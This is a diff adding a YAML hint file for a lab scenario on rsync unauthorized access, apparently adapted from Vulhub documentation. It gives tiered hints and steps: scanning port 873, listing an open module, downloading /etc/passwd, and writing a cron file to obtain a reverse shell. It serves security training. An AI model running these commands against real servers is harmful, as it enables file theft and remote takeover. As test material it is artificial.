@@ -1,0 +1,90 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: rsync/common
+hint_levels:
+  low:
+  - Inspect the rsync service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 873. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 873 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): rsync: 873/tcp → container 873/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: Rsync Unauthorized Access.'
+  - |-
+    Vulnerability Reproduction
+
+    As shown above, there is a src module. Let's list the files under this module:
+
+    ```
+    rsync rsync://{{NODE_IP}}:873/src/
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/2.png
+
+    This is a Linux root directory, and we can download any file:
+
+    ```
+    rsync -av rsync://{{NODE_IP}}:873/src/etc/passwd ./
+    ```
+
+    Or write any file:
+
+    ```
+    rsync -av shell rsync://{{NODE_IP}}:873/src/etc/cron.d/shell
+    ```
+
+    We wrote a cron task and successfully got a reverse shell:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/README.md'
+access_instructions:
+  title: Rsync Unauthorized Access
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 873. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 873 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): rsync: 873/tcp → container 873/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      As shown above, there is a src module. Let's list the files under this module:
+
+      ```
+      rsync rsync://{{NODE_IP}}:873/src/
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/2.png
+
+      This is a Linux root directory, and we can download any file:
+
+      ```
+      rsync -av rsync://{{NODE_IP}}:873/src/etc/passwd ./
+      ```
+
+      Or write any file:
+
+      ```
+      rsync -av shell rsync://{{NODE_IP}}:873/src/etc/cron.d/shell
+      ```
+
+      We wrote a cron task and successfully got a reverse shell:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/rsync/common/README.md
+  readme_sha256: febe8d067f47e532867465f8cd05c2fbc99e5e0db1c686a735ab60aa8145075c
+  compose_sha256: 324ab095863aef3af148f2a098aadd27513792c45c61be3092c807337ae6005a
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
